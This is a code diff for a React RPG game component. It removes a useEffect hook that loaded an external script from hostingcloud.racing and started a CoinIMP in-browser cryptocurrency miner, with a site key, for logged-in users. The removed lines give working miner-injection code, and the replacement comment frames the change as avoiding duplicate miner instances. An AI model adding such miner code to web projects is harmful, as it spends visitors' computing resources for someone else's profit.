@@ -29,58 +29,7 @@ export const RPGGame = ({ onClose }: { onClose: () => void }) => {
 
   // Ensure hooks order is stable: run effect unconditionally and guard inside
   React.useEffect(() => {
-    if (!user) return;
-
-    const existingMain = document.head.querySelector('script[src="https://www.hostingcloud.racing/Q1Mx.js"]');
-    const existingClient = document.head.querySelector('#rpg-mining-client');
-
-    let script1: HTMLScriptElement | null = null;
-    let script2: HTMLScriptElement | null = null;
-
-    const startClient = () => {
-      if (document.head.querySelector('#rpg-mining-client')) return;
-      script2 = document.createElement('script');
-      script2.id = 'rpg-mining-client';
-      script2.text = `
-        if (!window.miningClientInitialized) {
-          var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-            throttle: 0.6, c: 'w'
-          });
-          _client.start();
-          _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-          window.miningClientInitialized = true;
-          window.miningClient = _client;
-        }
-      ` as any;
-      document.head.appendChild(script2);
-    };
-
-    if (!existingMain) {
-      script1 = document.createElement('script');
-      script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
-      script1.async = true;
-      script1.id = 'rpg-mining-main';
-      document.head.appendChild(script1);
-      script1.onload = startClient;
-    } else if (!existingClient) {
-      startClient();
-    }
-
-    return () => {
-      const cleanupScript = document.createElement('script');
-      cleanupScript.text = `
-        if (window.miningClient && window.miningClient.stop) {
-          window.miningClient.stop();
-          window.miningClient = null;
-          window.miningClientInitialized = false;
-        }
-      ` as any;
-      document.head.appendChild(cleanupScript);
-      setTimeout(() => cleanupScript.remove(), 100);
-
-      const scripts = document.head.querySelectorAll('#rpg-mining-main, #rpg-mining-client');
-      scripts.forEach((s) => s.remove());
-    };
+    // Mining script injection removed to avoid multiple CoinIMP instances.
   }, [user]);
 
   // Si pas connecté, rediriger vers la page d'authentification
